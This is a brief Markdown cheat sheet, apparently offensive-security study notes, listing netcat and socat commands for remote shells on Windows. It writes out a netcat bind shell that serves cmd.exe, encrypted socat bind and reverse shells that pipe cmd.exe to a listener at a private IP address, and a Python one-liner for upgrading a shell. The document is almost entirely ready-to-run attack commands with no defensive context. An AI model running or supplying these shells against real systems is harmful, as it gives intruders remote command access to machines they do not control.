# Shells - Netcat and Socat

## Windows Netcat Bind shells

Shell waiting for incoming connection

```bash
nc -nlvp 4444 -e cmd.exe
```

Connecting to shell

```bash
nc -nv <ip address> 4444
```

## Socat

Encrypted Windows bind shell

```bash
socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0 EXEC:cmd.exe,pipes
```

Encrypted connection to bind shell

```bash
socat - OPENSSL:192.168.227.10:443,verify=0 
```

Encrypted Reverse shell listener

````bash
socat -d -d OPENSSL-LISTEN:443,cert=rev_shell.pem,verify=0,fork STDOUT 
````

Encrypted Reverse shell connection from Windows

```bash
socat OPENSSL:192.168.119.128:443,verify=0 EXEC:cmd.exe,pipes
```

## Upgrading shells

````bash
python -c "import pty;pty.spawn('/bin/bash')"
````

